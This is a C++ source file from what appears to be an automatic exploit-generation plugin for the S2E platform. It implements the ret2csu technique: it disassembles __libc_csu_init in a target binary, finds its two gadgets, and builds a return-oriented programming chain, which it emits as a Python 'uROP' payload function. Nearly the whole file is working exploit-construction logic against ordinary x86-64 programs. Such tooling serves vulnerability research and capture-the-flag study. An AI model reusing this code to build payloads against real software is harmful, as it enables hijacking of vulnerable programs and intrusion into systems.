// Copyright (C) 2021-2022, Marco Wang
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/Requiem/Requiem.h>
#include <s2e/Plugins/Requiem/Utils/StringUtil.h>

#include <algorithm>
#include <cassert>

#include "Ret2csu.h"

#define X86_64_MOV_INSN_LEN 3

namespace s2e::plugins::requiem {

Ret2csu::Ret2csu(Requiem &ctx) : Technique(ctx) {
    parseLibcCsuInit();
    searchGadget2CallTarget();
    buildRopChainsList();
    buildAuxiliaryFunction();

    resolveRequiredGadgets();
}


bool Ret2csu::checkRequirements() const {
   const auto &sym = m_ctx.getExploit().getElf().symbols();
   return sym.find("__libc_csu_init") != sym.end();
}

void Ret2csu::resolveRequiredGadgets() {
    // Gadgets
    m_ctx.getExploit().registerGadget("__libc_csu_init", m_libcCsuInit);
    m_ctx.getExploit().registerGadget("__libc_csu_init_gadget1", m_libcCsuInitGadget1);
    m_ctx.getExploit().registerGadget("__libc_csu_init_gadget2", m_libcCsuInitGadget2);

    // Memory locations
    m_ctx.getExploit().registerMemLocation("__libc_csu_init_call_target", m_libcCsuInitCallTarget);
}

std::string Ret2csu::getAuxiliaryFunctions() const {
    return m_auxiliaryFunction;
}

std::vector<std::vector<std::string>> Ret2csu::getRopChainsList() const {
    std::vector<std::vector<std::string>> ret
        = getRopChainsListWithArgs(m_arg1, m_arg2, m_arg3, m_addr, true);
    ret.front().insert(ret.front().begin(), "A8");
    return ret;
}

std::vector<std::string> Ret2csu::getExtraPayload() const {
    return {};
}


std::vector<std::vector<std::string>>
Ret2csu::getRopChainsListWithArgs(const std::string &arg1,
                                  const std::string &arg2,
                                  const std::string &arg3,
                                  const std::string &addr,
                                  bool arg1IsRdi) const {
    std::vector<std::vector<std::string>> ret(1);
    std::vector<std::string> &rop = ret.front();

    for (auto s : m_ropChainsList.front()) {
        if (s.find("arg1") != std::string::npos) {
            replace(s, "arg1", arg1);
            rop.push_back(s);
        } else if (s.find("arg2") != std::string::npos) {
            replace(s, "arg2", arg2);
            rop.push_back(s);
        } else if (s.find("arg3") != std::string::npos) {
            replace(s, "arg3", arg3);
            rop.push_back(s);
        } else if (s.find("addr") != std::string::npos) {
            replace(s, "addr", addr);
            rop.push_back(s);
        } else {
            rop.push_back(s);
        }
    }

    if (arg1IsRdi) {
        uint64_t gadgetAddr = m_ctx.getExploit().resolveGadget("pop rdi ; ret");
        rop.back() = format("p64(0x%x)", gadgetAddr);
        rop.push_back(format("p64(%s)", arg1.c_str()));
        rop.push_back(format("p64(%s)", addr.c_str()));
    }

    return ret;
}

void Ret2csu::parseLibcCsuInit() {
    // Since there are several variants of __libc_csu_init(),
    // we'll manually disassemble it and parse the offsets of its two gadgets.
    // XXX: define the string literals.
    m_libcCsuInit = m_ctx.getExploit().getElf().symbols()["__libc_csu_init"];

    // Convert instruction generator into a list of instructions.
    std::vector<Instruction> insns = m_ctx.getDisassembler().disasm("__libc_csu_init");

    // Find the offset of gadget1,
    // and save the order of popped registers in gadget1 as a vector.
    for (int i = insns.size() - 1; i >= 0; i--) {
        if (insns[i].mnemonic != "jne") {
            continue;
        }

        m_libcCsuInitGadget1 = insns[i + 1].address;

        m_gadget1Regs.reserve(7);
        for (int j = i + 1; j < i + 8; j++) {
            const std::string &op_str = insns[j].op_str;
            std::string reg = op_str.substr(0, op_str.find_first_of(','));
            m_gadget1Regs.push_back(std::move(reg));
        }

        m_gadget1Regs.erase(std::remove(m_gadget1Regs.begin(),
                                        m_gadget1Regs.end(),
                                        "rsp"), m_gadget1Regs.end());
        m_gadget1Regs.insert(m_gadget1Regs.begin(), "rsp");
        break;
    }

    assert(m_libcCsuInitGadget1);

    // Find the offset of gadget2,
    // and save the order of register assignments in gadget2 as a std::map<dest, src>.
    for (int i = insns.size() - 1; i >= 0; i--) {
        if (insns[i].mnemonic != "call") {
            continue;
        }

        assert(insns[i - 1].mnemonic == "mov");
        assert(insns[i - 2].mnemonic == "mov");
        assert(insns[i - 3].mnemonic == "mov");

        m_libcCsuInitGadget2 = insns[i].address - 3 * X86_64_MOV_INSN_LEN;

        for (int j = i - 3; j < i; j++) {
            const std::string &op_str = insns[j].op_str;
            size_t dstRegEndIdx = op_str.find_first_of(',');
            size_t srcRegStartIdx = dstRegEndIdx + 3;  // skips ", "
            std::string dstReg = op_str.substr(0, dstRegEndIdx);
            std::string srcReg = op_str.substr(srcRegStartIdx);
            m_gadget2Regs[dstReg] = srcReg;
        }

        // Parse call qword ptr [a + b*8]
        std::string op_str = insns[i].op_str;

        std::string trash1 = "qword ptr [";
        std::string trash2 = "*8]";
        replace(op_str, trash1, "");
        replace(op_str, trash2, "");

        m_gadget2CallReg1 = op_str.substr(op_str.find_first_of(' '));
        m_gadget2CallReg2 = op_str.substr(op_str.find_last_of('+') + 2);
        break;
    }

    assert(m_libcCsuInitGadget2);
}

void Ret2csu::searchGadget2CallTarget(std::string funcName) {
    /*
    uint64_t funcAddr = m_ctx.getExploit().getElf().symbols()[funcName];
    std::vector<uint64_t> candidates = m_ctx.mem().search(funcAddr);

    if (candidates.empty()) {
        m_ctx.log<WARN>() << "No candidates for __libc_csu_init()'s call target\n";
        return;
    }
    m_libcCsuInitCallTarget = candidates.front();
    */
}

void Ret2csu::buildRopChainsList() {
    std::map<std::string, std::string> transform = {
        {"rsp", "A8"},
        {"rbx", "p64(0)"},
        {"rbp", "p64(1)"},
        {slice(m_gadget2Regs["edi"], 0, 3), "p64(arg1)"},
        {slice(m_gadget2Regs["rsi"], 0, 3), "p64(arg2)"},
        {slice(m_gadget2Regs["rdx"], 0, 3), "p64(arg3)"},
        {m_gadget2CallReg1, format("p64(0x%x)", m_libcCsuInitCallTarget)}
    };

    m_ropChainsList.resize(1);
    std::vector<std::string> &rop = m_ropChainsList.front();

    rop.push_back("p64(__libc_csu_init_gadget1)");

    for (int i = 0; i < 7; i++) {
        rop.push_back(transform[m_gadget1Regs[i]]);
    }

    rop.push_back("p64(__libc_csu_init_gadget2)");

    for (int i = 0; i < 7; i++) {
        rop.push_back("A8");
    }

    rop.push_back("p64(addr)");
}

void Ret2csu::buildAuxiliaryFunction() {
    std::string f;

    for (const auto &payload : m_ropChainsList.front()) {
        if (f.empty()) {
            f += format("    payload  = %s\n", payload.c_str());
        } else {
            f += format("    payload += %s\n", payload.c_str());
        }
    }

    f  = "def uROP(addr, arg1, arg2, arg3) -> bytes:\n" + f;
    f += "    return payload";
    m_auxiliaryFunction = std::move(f);
}

}  // namespace s2e::plugins::requiem
